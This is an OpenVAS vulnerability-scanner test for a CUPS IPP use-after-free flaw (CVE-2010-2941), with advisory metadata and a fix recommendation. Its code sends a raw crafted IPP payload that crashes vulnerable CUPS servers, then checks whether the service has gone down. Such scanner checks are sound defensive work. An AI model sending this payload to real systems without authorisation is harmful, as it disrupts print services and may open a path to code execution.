###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cupsd_ipp_use_after_free_dos_vuln.nasl 13960 2019-03-01 13:18:27Z cfischer $
#
# CUPS IPP Use-After-Free Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apple:cups";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800182");
  script_version("$Revision: 13960 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-11-18 06:30:08 +0100 (Thu, 18 Nov 2010)");
  script_bugtraq_id(44530);
  script_cve_id("CVE-2010-2941");
  script_tag(name:"cvss_base", value:"7.9");
  script_tag(name:"cvss_base_vector", value:"AV:A/AC:M/Au:N/C:C/I:C/A:C");
  script_name("CUPS IPP Use-After-Free Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("secpod_cups_detect.nasl");
  script_require_ports("Services/www", 631);
  script_mandatory_keys("CUPS/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/62882");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=624438");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated attackers to
  cause a denial of service (use-after-free and application crash) or possibly
  execute arbitrary code via a crafted IPP request.");

  script_tag(name:"affected", value:"CUPS 1.4.4 and prior");

  script_tag(name:"insight", value:"The flaw is caused by improper allocation of memory for attribute values
  with invalid string data type.");

  script_tag(name:"solution", value:"Upgrade to 1.4.5 or above.");

  script_tag(name:"summary", value:"This host is running CUPS and is prone to Denial of Service vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.cups.org/software.php");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
host = http_host_name( port:port );

if( ! soc = open_sock_tcp( port ) ) exit( 0 );

post_data = string( 'POST /ipp/ HTTP/1.1\r\n',
                    'Host: ' + host + '\r\n',
                    'User-Agent: CUPS/1.3.4\r\n',
                    'Content-Type: application/ipp\r\n',
                    'Content-Length: 289\r\n',
                    'Expect: 100-continue\r\n\r\n'
                  );

raw_data = raw_string( 0x01, 0x01, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x01, 0x01,
                       0x47, 0x00, 0x12, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62,
                       0x75, 0x74, 0x65, 0x73, 0x2d, 0x63, 0x68, 0x61, 0x72,
                       0x73, 0x65, 0x74, 0x00, 0x05, 0x75, 0x74, 0x66, 0x2d,
                       0x38, 0x48, 0x00, 0x1b, 0x61, 0x74, 0x74, 0x72, 0x69,
                       0x62, 0x75, 0x74, 0x65, 0x73, 0x2d, 0x6e, 0x61, 0x74,
                       0x75, 0x72, 0x61, 0x6c, 0x2d, 0x6c, 0x61, 0x6e, 0x67,
                       0x75, 0x61, 0x67, 0x65, 0x00, 0x05, 0x65, 0x6e, 0x2d,
                       0x75, 0x73, 0x45, 0x00, 0x0b, 0x70, 0x72, 0x69, 0x6e,
                       0x74, 0x65, 0x72, 0x2d, 0x75, 0x72, 0x69, 0x00, 0x1b,
                       0x69, 0x70, 0x70, 0x3a, 0x2f, 0x2f, 0x31, 0x30, 0x2e,
                       0x31, 0x30, 0x2e, 0x31, 0x30, 0x2e, 0x32, 0x35, 0x31,
                       0x3a, 0x36, 0x33, 0x31, 0x2f, 0x69, 0x70, 0x70, 0x2f,
                       0x38, 0x00, 0x14, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73,
                       0x74, 0x65, 0x64, 0x2d, 0x61, 0x74, 0x74, 0x72, 0x69,
                       0x62, 0x75, 0x74, 0x65, 0x73, 0x00, 0x10, 0x63, 0x6f,
                       0x70, 0x69, 0x65, 0x73, 0x2d, 0x73, 0x75, 0x70, 0x70,
                       0x6f, 0x72, 0x74, 0x65, 0x64, 0x44, 0x00, 0x00, 0x00,
                       0x19, 0x64, 0x6f, 0x63, 0x75, 0x6d, 0x65, 0x6e, 0x74,
                       0x2d, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x2d, 0x73,
                       0x75, 0x70, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x44,
                       0x00, 0x00, 0x00, 0x19, 0x70, 0x72, 0x69, 0x6e, 0x74,
                       0x65, 0x72, 0x2d, 0x69, 0x73, 0x2d, 0x61, 0x63, 0x63,
                       0x65, 0x70, 0x74, 0x69, 0x6e, 0x67, 0x2d, 0x6a, 0x6f,
                       0x62, 0x73, 0x44, 0x00, 0x00, 0x00, 0x0d, 0x70, 0x72,
                       0x69, 0x6e, 0x74, 0x65, 0x72, 0x2d, 0x73, 0x74, 0x61,
                       0x74, 0x65, 0x44, 0x00, 0x00, 0x00, 0x15, 0x70, 0x72,
                       0x69, 0x6e, 0x74, 0x65, 0x72, 0x2d, 0x73, 0x74, 0x61,
                       0x74, 0x65, 0x2d, 0x6d, 0x65, 0x73, 0x73, 0x61, 0x67,
                       0x65, 0x44, 0x00, 0x00, 0x00, 0x15, 0x70, 0x72, 0x69,
                       0x6e, 0x74, 0x65, 0x72, 0x2d, 0x73, 0x74, 0x61, 0x74,
                       0x65, 0x2d, 0x72, 0x65, 0x61, 0x73, 0x6f, 0x6e, 0x73,
                       0x03
                      );

send( socket:soc, data:post_data );
send( socket:soc, data:raw_data );

close( soc );
sleep( 5 );

soc = open_sock_tcp( port );
if( ! soc ) {
  security_message( port:port );
  exit( 0 );
}

close( soc );
exit( 99 );
